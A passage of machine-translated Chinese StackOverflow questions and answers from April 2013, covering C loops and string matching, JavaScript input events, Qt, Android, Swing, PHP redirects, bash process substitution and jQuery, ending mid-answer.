# StackOverflow 问答 16013000-16013999

# c - 在 c 中使用赋值语句 for 循环条件

> ID：16013011
> 
> 赞同：2
> 
> 时间：2013-04-15T10:32:43.407
> 
> 标签：c

语句 A 和 B 是否相等？

```
int i;
char a[] = "Hello\n";
char b[100]; 
```

声明 A，

```
for(i=0; b[i] != '\0'; ++i)
    b[i] = a[i]; 
```

声明 B，

```
for(i=0; (b[i] = a[i]) != '\0'; ++i)
      ; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T10:35:33.813

不，它们是不同的：

*   第一个循环检查赋值`b[i]` *前*的值；
*   第二个循环检查赋值`b[i]` *后*的值。

结果，第二个循环将复制`a`into的内容`b`，并在复制后停止`\0`。第一个循环将在执行复制之前遇到第一个`\0`in时立即停止复制`b`，而忽略它可能在 中找到的任何零`a`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-15T10:37:08.793

**不，他们不是。**

在语句 A 中，您`b[i]`在为其赋值之前进行检查

在第二个语句中，您在检查之前分配值。

第一个类似于*while 循环*，第二个类似于*do-while 循环*。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T10:36:01.520

不，他们不一样

在第二个你设置了`b[i]`值，然后你检查了`!= '\0'`。

首先你已经检查了`b[i]` `!= '\0'`之前设置它

我也可以给你建议：

```
int i = -1;
while(b[++i] = a[i]); 
```

# mysql - MonkeyRunner 和 MySQL

> ID：16013014
> 
> 赞同：0
> 
> 时间：2013-04-15T10:32:58.193
> 
> 标签：mysql, jython, monkeyrunner

我在使用带有 MonkeyRunner 的 MySQL 时遇到问题，需要有关 MySQL 驱动程序名称的帮助。我的脚本的开头是：

```
#coding : utf-8

from com.android.monkeyrunner import MonkeyRunner,MonkeyDevice
from com.ziclix.python.sql import zxJDBC

db = zxJDBC.connect('jdbc:mysql://localhost/android','dani','123456','com.mysql.jdbc.Driver')
.
.
etc 
```

每次我得到一个错误，即使使用**org.git.mm.mysql.Driver也找不到****com.mysql.jdbc.Driver**。我将类路径设置如下：

```
export CLASSPATH=$CLASSPATH:/usr/share/java/mysql-connector-java.5.1.10.jar 
```

任何提示或命中？

问候，，，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:52:23.917

您需要在正确的位置包含相关的 jar。应该有一个 libs 文件夹，您需要在其中放置 jar。它应该位于项目文件夹的顶层，与 src 和 res 文件夹处于同一级别。

# html5-video - 如何在没有 CDN swf 文件的情况下通过 Flash 回退使用 Video.js 播放器

> ID：16013020
> 
> 赞同：2
> 
> 时间：2013-04-15T10:33:23.553
> 
> 标签：html5-video, video.js, zencoder

IE8 或更早版本会自动使用 Flash 后备播放器，但播放器托管在 CDN 中。

我想`video-js.swf`在我的服务器中使用托管文件而不是 CDN 内容。因为 CDN swf 文件不安全。

Video.js 版本为 3.2，目前可以从[http://videojs.com/](http://videojs.com/)下载。

我试过[这段代码](http://help.videojs.com/discussions/suggestions/184-using-protocol-relative-urls-to-switch-between-http-and-https)，但它不起作用。

有人可以帮我解决问题吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-28T01:31:41.007

使用该链接，我能够找到其中一个链接中列出的 swf 文件：

[http://vjs.zencdn.net/c/video-js.swf](http://vjs.zencdn.net/c/video-js.swf)

# javascript - 检测输入类型文本的编程更改

> ID：16013024
> 
> 赞同：43
> 
> 时间：2013-04-15T10:33:49.127
> 
> 标签：javascript, html

有没有办法在脚本更改输入类型文本的值时获得通知。

我有

```
<input id='test' type='text' /> 
```

和一个脚本

```
document.getElementById('test').value = 'bbb'; 
```

我想收到有关文本更改的通知。

我知道我可以通过 keydown、keyup、onblur 等通知我（如果我试图跟踪用户输入，这会起作用）但是如果以编程方式完成更改呢？

非常感谢

ps 请不要使用 JQuery，或者如果 jquery 这样做，有人可以解释它是如何实现的。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-04-15T10:52:02.373

如果您使用的是现代浏览器，则可以尝试使用以下方法：

```
var input = document.getElementById('test');
input._value = input.value;
Object.defineProperty(input, "value", {
    get: function() {return this._value;},
    set: function(v) {
        // Do your stuff
        this._value = v;
    }
}); 
```

如果您实际上不期望任何用户输入（即隐藏类型输入字段），则此解决方案很好，因为它对DOM 基本功能*具有极大的破坏性*。记在脑子里。

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2015-05-07T19:53:54.193

我发现最简单的方法是手动触发事件：

```
document.getElementById('test').value = 'bbb';
var evt = new CustomEvent('change');
document.getElementById('test').dispatchEvent(evt); 
```

当以编程方式更改值时，仅监听`change`事件很容易出错。但是由于您要更改值，因此添加两行并使用[CustomEvent](https://developer.mozilla.org/en-US/docs/Web/API/CustomEvent/CustomEvent)触发更改事件。

那么你就可以捕捉到这个`change`事件，或者内联：

```
<input id="test" onchange="console.log(this)"> 
```

或与听众：

```
document.getElementById('test').addEventListener('change',function(event) {
    console.log(event.target);
}); 
```

这样做的好处是，如果您有一个可以由用户更改的输入，您可以捕获这两个事件（来自用户或脚本）

然而，这取决于您自己以编程方式更改输入值的事实。如果您正在使用更改输入值的库（例如[datepickr](https://github.com/joshsalverda/datepickr)），您可能必须进入代码并将这两行添加到正确的位置。

## 现场演示：

```
// input node reference
const inputElem = document.querySelector('input')

// bind "change" event listener
inputElem.addEventListener('change', e => console.log(e.target.value))

// programatically change the input's value every 1 second
setInterval(() => { 
  // generate random value
  inputElem.value = Math.random() * 100 | 0; 

  // simulate the "change" event
  var evt = new CustomEvent('change')
  inputElem.dispatchEvent(evt)
}, 1000);
```

```
<input>
```

# image - 在 Qt 中将图像设置为标签

> ID：16013027
> 
> 赞同：10
> 
> 时间：2013-04-15T10:33:56.650
> 
> 标签：image, qt

我需要将标签图像放入 Qt Widget

我尝试在小部件上放置一个标签，然后在我选择的文本下右侧的属性上放置一个标签，然后`pixmap`选择我想要使用的图像。

但是，当我运行程序时，没有图像出现任何想法，这是为什么？

我也试过：

```
QLabel label("<img src='image.jpg' />");
label.show(); 
```

但是没有运气不要认为我用对了

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-15T10:39:18.660

`QLabel`使用诺基亚公司A提供的官方“添加图像”方式`QPixmap`。

```
QLabel label;
QPixmap pixmap(":/path/to/your/image.jpg");
label.setPixmap(pixmap);
label.setMask(pixmap.mask());

label.show(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-03-04T12:52:02.440

```
QIcon searchIcon = Icon::fromTheme("edit-find");
searchLabel->setPixmap( searchIcon.pixmap(16,16) ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-08-15T01:37:32.697

另一种方法是使用 Qt 样式表。

```
QLabel label;
label.setStyleSheet("background-image: url(:/images/assets/your.png)") 
```

# c - 确保字符串与 c 中的某种格式匹配

> ID：16013031
> 
> 赞同：1
> 
> 时间：2013-04-15T10:34:15.833
> 
> 标签：c, string

如何比较字符串以匹配c中的特殊格式？

我想检查字符串是否与“PCn.Value”匹配。

IE。它必须匹配 PC1.value, PC2.value,...

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T10:47:21.170

`sscanf()`有帮助

```
char S[32];
if (sscanf(str, "PC%[0-9].Valu%1[e]%c", S, &S[30], &S[30])==2) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-15T10:40:39.160

假设一个数字，这可能既足够又最有效：

```
if (strncmp (s, "PC", 2)
    && (s[2] >= '0' && s[2] <= '9')
    && strcmp (s+3, ".value"))
  {
    do_stuff_if_string_matches(s[2]-'0');
  } 
```

或者，如果您需要任意无符号整数：

```
char n[SOME_SIZE];
int count = 0;
if (sscanf (s, "PC%[0-9].value%n", n, &count)
    && count == strlen (s))
  {
    /* `n' now contains the number as a string.  */
    do_stuff_if_string_matches(atoi(n));
  } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T10:43:23.687

检查字符串是否匹配给定格式的问题是一个相当广泛和棘手的话题。作为一般解决方案，正则[表达式](http://en.wikipedia.org/wiki/Regular_expression)是一个有用的工具，[解析表达式语法](http://en.wikipedia.org/wiki/Parsing_expression_grammar)也是如此。但是，在您的情况下，它相当简单，特别是如果`n`只达到 9。在这种情况下，这是一个计算效率非常高的解决方案：

```
#include <string.h>
char check_PC_N_dot_value(char* str) {
    // only works when 0 <= n <= 9
    return
        str[0] == 'P' &&
        str[1] == 'C' &&
        str[2] >= '0' &&
        str[2] <= '9' &&
        str[3] == '.' &&
        str[4] == 'v' &&
        str[5] == 'a' &&
        str[6] == 'l' &&
        str[7] == 'u' &&
        str[8] == 'e' &&
        str[9] == 0;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-15T10:48:35.047

使用[posix 正则表达式](http://www.peope.net/old/regex.html)，这样您就可以为进一步、更复杂的测试做好准备。

例如

```
#include <sys/types.h>
#include <regex.h>
#include <stdio.h>

...
...
regex_t regex;
int reti;

if (regcomp(&regex, "PC[[:digit:]]+\.value", 0))
{
    printf("Error compiling regex\n");
    return(1);
}

reti = regexec(&regex, yourstring, 0, NULL, 0);

if (reti == 0)
    printf("String matches\n");
else
{
    if (reti == REG_NOMATCH)
        printf("String not matches\n");
    else
        printf("Error\n");
}

regfree(&regex); 
```

# android - navigation_mode_tabs 垂直不起作用

> ID：16013036
> 
> 赞同：2
> 
> 时间：2013-04-15T10:34:30.850
> 
> 标签：android, tabs, android-actionbar

我正在使用 ActionBar

```
final ActionBar actionBar = getActionBar();
actionBar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS); 
```

水平模式运行良好，但在垂直模式下，单独的栏（称为“堆叠操作栏”）不起作用，其行为类似于`NAVIGATION_MODE_LIST`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:42:25.190

如果您想知道，这是正常的，而不是错误。在 Google 代码论坛上参考[此](http://code.google.com/p/android/issues/detail?id=24439)讨论。不幸的是，你不能对它做些什么。

# javascript - 编辑甜甜圈 Highchart

> ID：16013037
> 
> 赞同：1
> 
> 时间：2013-04-15T10:34:32.550
> 
> 标签：javascript, highcharts

需要帮助删除图表灰色部分中从图表中出来的灰线。

[http://jsfiddle.net/Y2e5p/](http://jsfiddle.net/Y2e5p/)

```
// Build the chart
$('#' + div_id).highcharts({
    chart: {
        plotBackgroundColor: null,
        plotBorderWidth: null,
        plotShadow: false,
        type: 'pie'
    },
    title: {
        text: title
    },
    tooltip: {
        enabled: false
    },
    plotOptions: {
        pie: {
            allowPointSelect: false,
            cursor: 'pointer'
        }
    },
    series: [{
        type: 'pie',
        name: title,
        size: '60%',
        innerSize: '40%',
        data: [{
            y: number,
            name: title,
            color: color,
            dataLabels: {
                enabled: true,
                color: '#000000',
                inside: true,
                formatter: function () {
                    return Math.floor(Number(this.percentage)) + ' %';
                }
            }
        }, {
            y: (100 - number),
            name: " ",
            color: '#AAAAAA',
            dataLabels: {
                enabled: true
            }
        }]
    }]
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:59:58.123

您可以为点设置数据标签，并在格式化程序中识别数据标签是否应该

[http://jsfiddle.net/Y2e5p/2/](http://jsfiddle.net/Y2e5p/2/)

```
plotOptions: {
        pie: {
            allowPointSelect: false,
            cursor: 'pointer',
            dataLabels: {
                enabled:true,
                formatter: function () {
                    if(this.point.dataLabels.enabled)
                        return Math.floor(Number(this.percentage)) + ' %';
                    else
                        return null;
                }
            }
        }
    }, 
```

# java - 如何将jsp文本字段数据导入java文件？

> ID：16013040
> 
> 赞同：0
> 
> 时间：2013-04-15T10:34:38.377
> 
> 标签：java, jsp, liferay

您好，我正在尝试获取其他 java 文件中文本字段的值。我正在尝试以下代码。

```
 <aui:form action="<%=editpollURL.toString() %>" enctype="multipart/form-data" 
  method="post" >
 <aui:input name="title" label="title"/>
 <aui:input type="textarea" name="pollquestion" rows="5" cols="25" label="Poll   
 Question" /> 
```

以下是我的java代码。

```
String title = ParamUtil.getString(actionRequest, "title");
String pollquestion = ParamUtil.getString(actionRequest, "pollquestion");

System.out.println("Your inputs ==> " + title + ", " + pollquestion); 
```

我无法从 jsp 文件中写入用户输入。请帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-17T11:55:50.313

对于您的情况，您应该像这样使用 UploadPortletRequest：

```
public void yourAction(ActionRequest request, ActionResponse response)
        throws PortletException, IOException {

    UploadPortletRequest uploadRequest = PortalUtil.getUploadPortletRequest(request);
    String filePath = uploadRequest.getFileName("filePath");

    try{
        java.io.File file = uploadRequest.getFile("filePath");
    //Manage the Upload

    }catch (Exception e) {
        ///
    }

} 
```

您的 jsp 输入可能类似于：

```
<aui:input type="file" label="upload your file"  name="filePath" /> 
```

确保使用匹配的“名称”属性，并使用 'type="file"'

# java - 更改应用程序背景动画的首选项

> ID：16013043
> 
> 赞同：0
> 
> 时间：2013-04-15T10:34:41.253
> 
> 标签：java, android, list, listpreference

我正在尝试在应用程序中进行设置，特别是 ListPreference 以便能够更改应用程序的背景动画，但我不能这样做，如果您选择选项 1 或选项 2，则没有任何变化......我遵循了类似的教程并试图让它对我有用，但到目前为止还没有。这里是java

```
SharedPreferences backChooser = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
    String values = backChooser.getString("list", "1");
    img = (ImageView) findViewById(R.id.imageView1);
    img.setBackgroundResource(R.drawable.anim1);
    animation = (AnimationDrawable) img.getDrawable();
    animation.start();

    if (values.contentEquals("1")) {
        img.setBackgroundResource(R.drawable.anim1);
        animation = (AnimationDrawable) img.getDrawable();
        animation.start();
    }
    if (values.contentEquals("2")) {
        img.setBackgroundResource(R.drawable.anim2);
        animation = (AnimationDrawable) img.getDrawable();
        animation.start();
    } 
```

这是首选项的xml

```
<?xml version="1.0" encoding="utf-8"?> 
```

```
<ListPreference
    android:entries="@array/list"
    android:entryValues="@array/listvalues"
    android:key="list"
    android:summary="This is a list to choose from"
    android:title="List" /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:48:53.220

这行代码

```
img.setBackgroundResource(R.drawable.anim1); 
```

设置 ImageView 的“背景”。

就像这段代码

```
img.getDrawable(); 
```

获取 ImageView 的“可绘制”或上面的图像，而不是实际的“背景”图像。

由于您要检索您曾经设置为“img”的背景的图像，因此此代码

```
img.getBackground(); 
```

是您需要的。

# android - ListView 仅在附加 HierarchyViewer 时出现

> ID：16013044
> 
> 赞同：1
> 
> 时间：2013-04-15T10:34:40.990
> 
> 标签：android, android-ui, hierarchyviewer

我有一个扩展`ListView`的自定义。该列表是在这样的布局中定义的：`Adapter``CursorAdapter`

```
<RelativeLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:gravity="center">

        <ProgressBar
            android:id="@android:id/empty"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            style="@style/ProgressBar.Itasa.Indeterminate.Large"/>

    <net.italiansubs.droitasa.widget.HookedListView
            android:id="@android:id/list"
            style="@style/NewsList"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:visibility="gone"/>

</RelativeLayout> 
```

`HookedListView`看起来像这样：

```
package net.italiansubs.droitasa.widget;

import android.content.Context;
import android.os.Handler;
import android.util.AttributeSet;
import android.widget.ListView;
import net.italiansubs.droitasa.util.OnLayoutChangedListener;

/**
 * An extended ListView that has an hook for getting layout changes.
 *
 * @author Sebastiano Poggi, Francesco Pontillo
 */
public class HookedListView extends ListView {

    private OnLayoutChangedListener mLayoutListener;
    private final Handler mHandler;
    private boolean mFirstLayout = true;

    public HookedListView(Context context) {
        super(context);
        mHandler = new Handler(context.getMainLooper());
    }

    public HookedListView(Context context, AttributeSet attrs) {
        super(context, attrs);
        mHandler = new Handler(context.getMainLooper());
    }

    public HookedListView(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
        mHandler = new Handler(context.getMainLooper());
    }

    @Override
    protected void onLayout(boolean changed, int l, int t, int r, int b) {
        super.onLayout(changed, l, t, r, b);

        if (mFirstLayout) {
            // In this case we want to avoid posting, because this could
            // have the two layout passes happen one after the other with
            // a pause between each other, with the effects, for example,
            // of having the number of columns change
            mFirstLayout = false;

            new LayoutChangedRunnable().run();
        }
        else if (changed) {
            mHandler.postAtFrontOfQueue(new LayoutChangedRunnable());
        }
    }

    /**
     * Sets the OnLayoutChangedListener for this instance, that will
     * receive callbacks after layout changes for the View.
     *
     * @param l The new OnLayoutChangedListener, or null to remove
     *          the current listener.
     */
    public void setOnLayoutChangedListener(OnLayoutChangedListener l) {
        mLayoutListener = l;
    }

    /**
     * Gets the OnLayoutChangedListener set for this instance.
     *
     * @return Returns the instance's OnLayoutChangedListener, if any.
     */
    public OnLayoutChangedListener getOnLayoutChangedListener() {
        return mLayoutListener;
    }

    private class LayoutChangedRunnable implements Runnable {

        @Override
        public void run() {
            // We don't need to synchronize on the listener because the handler
            // is hooked up to the main thread's looper so we shouldn't be
            // called from other threads.

            if (mLayoutListener != null) {
                mLayoutListener.onLayoutChanged(HookedListView.this);
            }
        }
    }
} 
```

我遇到的问题是`ListView`内容没有出现在设备上，即使`Cursor`有项目，`Adapter`有项目，`ListView`本身也有项目。**将HierarchyViewer**附加到窗口确实可以使`ListView`项目在没有任何进一步干预的情况下出现，并且请求从 web 服务更新数据也是如此，这反过来会更新`ContentProvider`. `Cursor`我已经尝试为和设置内容观察器`Adapter`，并记录以确保将正确数量的项目设置为`Adapter`，并且一切都按预期工作。由于我们的自定义，我们已经在 List 上执行了一轮额外的布局`MultiCoumnAdapter`，计算第一轮之后的列数`ListView`布局传递（因此需要 a `HookedListView`）。

我尝试过使用标准`CursorAdapter`，而不是我自己的`MultiColumnAdapter`（模拟 a `GridView`，没有所有限制和错误），但这并没有改变任何东西。

`Fragment`是`Activity`;的唯一内容 本身基本上什么也不做，只是从用于启动它`Activity`的附加组件中获取项目 ID ，并将其传递给，它在的布局 XML 中定义为唯一的元素。`Intent``Fragment``Activity`

所做的`Fragment`只是处理`ContentProvider`使用标准从应用程序获取数据`CursorLoader`。我们使用[DataDroid](http://www.datadroidlib.com)来管理从 web 服务获取新数据。

有没有人对这里发生的事情有丝毫线索？似乎有些东西卡在`ListView`自己的代码中，直到我们更新底层`Cursor`......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T11:56:23.907

您在 ListView 上搞乱 onLayout 的事实敲响了警钟。为什么不直接使用带有[OnGlobalLayoutListener](https://developer.android.com/reference/android/view/ViewTreeObserver.OnGlobalLayoutListener.html)的标准 ListView呢？

或者，如果您需要自定义 ListView，请尝试将您的更改`onLayout()`为：

```
final LayoutChangedRunnable mLayoutRunnable = new LayoutChangedRunnable()

@Override
protected void onLayout(boolean changed, int l, int t, int r, int b) {
    super.onLayout(changed, l, t, r, b);

    if (changed) {
        post(mLayoutRunnable);
    }
} 
```

# java - SwingUtilities.invokeLater() 仅在一帧期间显示

> ID：16013050
> 
> 赞同：1
> 
> 时间：2013-04-15T10:35:05.273
> 
> 标签：java, swing, swingutilities, invokelater

我正在使用 Swing 来创建一个小的 java 2D 游戏。我只尝试显示图像。因为我不在 EDT 上，所以我使用 SwingUtilities.invokeLater() 来做这些事情。当我使用它时，图像不显示（实际上它在几毫秒内显示并消失）。当我不使用 SwingUtilities.invokeLater() 时，图像会正确显示，但我需要使用 invokeLater()。

这是我的基本代码：

```
public class Test {

/**
 * @param args
 */
public static void main(String[] args) {
    try {
        SwingUtilities.invokeAndWait(new Runnable() {

            @Override
            public void run() {
                final BreizhFrame frame = new BreizhFrame();
                File imgFile = new File("src/test/lvl1-800x450.jpg");
                System.out.println(String.valueOf(imgFile.exists()));
                System.out.println(SwingUtilities.isEventDispatchThread());
                Image i;
                try {
                    i = ImageIO.read(imgFile);
                    frame.getGraphics().drawImage(i, 0, 0, null);
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        });
    } catch (InvocationTargetException | InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

} 
```

}

任何想法 ？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T10:47:12.203

这不是你在 Java 中的做法。是的，您正在绘制图像，但一段时间后，控件会失效，并且会在没有图像的情况下重新绘制。

[本教程应该可以帮助你](http://docs.oracle.com/javase/tutorial/uiswing/painting/)

# load-balancing - 不成比例的工作人员之间的负载平衡作业队列

> ID：16013051
> 
> 赞同：2
> 
> 时间：2013-04-15T10:35:08.023
> 
> 标签：load-balancing, job-scheduling, beanstalkd

我正在开发一种自动管理作业队列的工具（在本例中为 Beanstalkd）。目前，您必须手动设置可用工作人员的数量才能将作业从队列中拉出，但这不允许作业高峰，否则会在作业时间较短时浪费资源。

我有一个在作业队列服务器和工作人员上运行的客户端/服务器设置。客户端连接到服务器并报告可用资源（CPU/内存）以及它可以运行的作业类型。然后，服务器监控队列并向连接的客户端指示每秒运行多少个工作人员来处理该队列。目前有大约一百种不同的工作器类型，它们都使用非常不同数量的 CPU/内存，工作器服务器本身具有不同的性能水平。

我正在寻找基于作业队列长度和每个工作人员的资源需求来最有效地平衡工作负载的技术 - 例如，一些工作人员使用 100% 的核心持续 5 秒，而其他工作人员需要几微秒才能完成。此外，某些工作的优先级高于其他工作。

# c++ - C DLL/lib 中的 C++ 访问函数

> ID：16013052
> 
> 赞同：2
> 
> 时间：2013-04-15T10:35:08.613
> 
> 标签：c++, c, dll, static-libraries

我拼命地试图访问一些硬件提供的 DLL。我有 DLL、LIB 文件和 DLL 的标头。

我第一次尝试使用 C#，但由于传递的大型数据结构而失败。我调用了函数，但修改的结构中的值不正确。

然后我考虑用 C++ 编写一个包装类并将其用作 C# 的库。但是在这里我可以再次调用该函数，但如果我测试了一个传递的有符号长整数，它是“1072955392l”而不是“-1l”。

然后我将 cpp 文件重命名为“.c”并再次编译。现在我得到了正确的值。

从 C 到 C++ 的数据类型是否存在一些差异？

提供的包含文件中 LIb 的函数声明如下：

```
_declspec (dllimport) long ResetControl(Registers* regs); 
```

我使用 VS2013 编译：

```
cl test.cpp /link test.lib
cl test.c /link test.lib 
```

cpp 文件和 c 文件是相同的，除非我需要为 cpp 包含 #include 并将 dll 包含标头包装在

```
extern "C"
{
    #include "test.h"
} 
```

test.c 文件如下所示：

```
//#include <windows.h>
#include <stdlib.h> 
#include <malloc.h>

#include <stdio.h>
#include <math.h>

#include "test.h"

int main (int argc, char **argv)
{

  Registers Regs;
  Reset (&Regs); 
  printf ("Value: %dl\n\r", Regs.Product);
  return 0;
} 
```

C++ 文件：

```
#include <windows.h>
#include <stdlib.h> 
#include <malloc.h>
#include <stdio.h>
#include <math.h>

extern "C"
{
    #include "test.h"
}

int main (int argc, char **argv)
{
  Registers Regs;
  Reset (&Regs);
  printf ("Value: %dl\n\r", Regs.Product);
  return 0;
} 
```

两者都编译，但打印 Regs.Products 的结果不同：

```
C: -1l
C++: 1072955392l 
```

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-14T12:20:10.307

我在某处看到在编译 DLL 的客户端时需要**对齐 4 个字节。**

但是看看这些页面：

*   [http://www.codeproject.com/Articles/21/Beginner-s-Tutorial-Calling-Visual-Basic-ActiveX-D](http://www.codeproject.com/Articles/21/Beginner-s-Tutorial-Calling-Visual-Basic-ActiveX-D)
*   [http://www.codeproject.com/Articles/6242/Step-by-Step-Calling-C-DLLs-from-VC-and-VB-Part](http://www.codeproject.com/Articles/6242/Step-by-Step-Calling-C-DLLs-from-VC-and-VB-Part)

亚历山大

# php - 如果第一次访问，将用户重定向到另一个国家/地区站点

> ID：16013058
> 
> 赞同：0
> 
> 时间：2013-04-15T10:35:51.960
> 
> 标签：php, session

我正在尝试计算启用以下功能所需的 PHP；

如果用户第一次从英国以外的地方访问我们的 .co.uk 网站，则将他们重定向到相应的国家/地区网站。但是，如果他们再次访问 .co.uk 网站，我们不会重定向他们。

我有以下代码来检查会话以查看它是否是用户的第一次访问，然后将它们重定向到 .de 站点。但显然这并没有正确检查他们的原籍国并适当地重定向他们。我需要将 FR 用户重定向到 .fr 并将 DE 用户重定向到 .de 等。所以我想知道如果这是他们第一次访问，是否有人可以帮助丢失的部分根据国家/地区进行正确的重定向？

```
<?php

session_start(); 

if(isset($SESSION['views'])){
    $_SESSION['views']++;
}else{
    $_SESSION['views'] = 0;
    header("location: http://www.domain.de");
    exit();
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:47:14.610

您应该检查 HTTP_ACCEPT_LANGUAGE 标头以检查用户使用的语言和会话或 cookie 以检查它是否是第一次访问。

拥有这两个变量使您能够将用户重定向到正确的页面。

检查此网址了解更多详情：[http ://www.phptutorial.info/scripts/languages.php](http://www.phptutorial.info/scripts/languages.php)

# bash - 差异脚本错误

> ID：16013060
> 
> 赞同：1
> 
> 时间：2013-04-15T10:36:06.230
> 
> 标签：bash, shell, diff

当我执行以下命令时，它可以正常工作（它提供了文本文件之间的差异）

```
diff <(sed -n '/eTopUp MU(55) Gateway Status1:/,/eTopUp MU(60) Gateway Status:/p' /root/scripts/msmscgateway |grep "CIMD2:" |awk '{print $1, $2}') <(sed -n '/eTopUp MU(55) Gateway Status1:/,/eTopUp MU(60) Gateway Status:/p' /root/scripts/last/msmscgatewaylast |grep "CIMD2:" |awk '{print $1, $2}') 
```

当我通过脚本运行它时，它给出了以下错误

```
test4.sh: line 1: syntax error near unexpected token `(' t 
```

帮我修复错误

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T16:01:19.247

```
sh test.sh 
```

这应该是

```
bash test.sh 
```

[`ref`](http://mywiki.wooledge.org/ProcessSubstitution)

# jquery - ToggleClass 不起作用

> ID：16013065
> 
> 赞同：0
> 
> 时间：2013-04-15T10:36:14.710
> 
> 标签：jquery, css, toggleclass

当我单击它时，我有一些想要“突出显示”的 HTML。很简单的东西，但我一辈子都不能让 toggleClass 工作：/

这是HTML：

```
<div id="mainContent">
    <div id="pageTop">
        ...
    </div>

    <div id="content">
        <h2>2 Special Offers</h2>
        <p>1) Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's.</p>
      <div id="prod1">
            <img src="images/prod1-1.png" width="130" height="109" alt="">
        </div>

        <div id="prod2">
            <div id="holdingBox1" class="one">
                <p>Choose from over 32 products</p>
            </div>
        </div>

        <div id="prod3">
            <div id="holdingBox2" class="two">
                <p>Choose from over 32 products</p>
            </div>
        </div>
    </div>

    <div class="flyout1">
        <div id="subProd">Prod 1</div>
        <div id="subProd">Prod 2</div>
        <div id="subProd">Prod 3</div>
        <div id="subProd">Prod 4</div>
        <div id="subProd">Prod 5</div>
        <div id="subProd">Prod 6</div>
        <div id="subProd">Prod 7</div>
        <div id="subProd">Prod 8</div>
    </div>

    <div class="flyout2">
        <div id="subProd">Prod 1</div>
        <div id="subProd">Prod 2</div>
        <div id="subProd">Prod 3</div>
        <div id="subProd">Prod 4</div>
        <div id="subProd">Prod 5</div>
        <div id="subProd">Prod 6</div>
        <div id="subProd">Prod 7</div>
        <div id="subProd">Prod 8</div>
    </div>

    <div id="restOfPage">
    ...
    </div>
</div> 
```

这是jQuery：

```
$(document).ready(function() {
$('.flyout1').hide();
$("#holdingBox1").on("click",function(){
    $(this).toggleClass("hover");
    $(".flyout1").slideToggle();
    $(".flyout2").hide();
});
$('.flyout2').hide();
$("#holdingBox2").on("click",function(){
    $(this).toggleClass("hover");
    $(".flyout2").slideToggle();
    $(".flyout1").hide();
}); }); 
```

我隐藏层上的 slideToggle 东西效果很好，添加其他功能似乎会破坏它：/

这是我要应用的 CSS“悬停”

```
.hover { border:1px solid red; } 
```

任何关于我如何彻底解决这个问题的想法都将不胜感激，因为我看不出我做错了什么：/

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T10:40:59.523

我让你`jquery`有点紧张：[jsfiddle](http://jsfiddle.net/2U3Ww/5/)

但看起来您的代码正在运行。除非有你没有提到的东西

查询：

```
$(document).ready(function() {
$("#holdingBox1").on("click",function(){
    $(this).toggleClass("hover");
    $(".flyout1").slideToggle();
    $(".flyout2").hide();
});

$("#holdingBox2").on("click",function(){
    $(this).toggleClass("hover");
    $(".flyout2").slideToggle();
    $(".flyout1").hide();
}); }); 
```

CSS

```
.hover { border:1px solid red; }
.flyout1{display:none;}
.flyout2{display:none;} 
```

# jquery - Ajax 淡入 MySQL 的新结果

> ID：16013068
> 
> 赞同：0
> 
> 时间：2013-04-15T10:36:19.410
> 
> 标签：jquery, mysql, ajax

我有一个类似于 Facebook 的系统，其中帖子是从 MySQL 中的表自动更新的。目前，它只是每 10 秒刷新一次 div。这是代码：

```
<script type="text/javascript">
        var auto_refresh = setInterval(
        function(){
            $('#refresh').load('index.php?_=' +Math.random()+' #refresh').fadeIn("slow");
        }, 10000);
</script> 
```

我希望只有在 MySQL 表中有新行并且新结果淡入时才更新 div。有没有办法做到这一点？我到处搜索，尝试了一切，但似乎没有任何效果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T10:53:57.973

谷歌长轮询是针对您用于服务器端编程的任何语言进行研究的方法。我正在使用 java 和 comet api。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-16T08:41:00.157

我发现了如何做到这一点。如果有人有同样的问题，这是我使用的：

```
var cacheData;
var data = $('#refresh').html();
var auto_refresh = setInterval(
function ()
{
    $.ajax({
        url: 'index.php',
        type: 'POST',
        data: data,
        dataType: 'html',
        success: function(data) {
            if (data !== cacheData){
                //data has changed (or it's the first call), save new cache data and update div
                cacheData = data;
                //$('#refresh').fadeOut("slow").html(data).fadeIn("slow");
                //$('#refresh').fadeOut("slow").load('index.php?_=' +Math.random()+' #refresh').slideDown("slow");
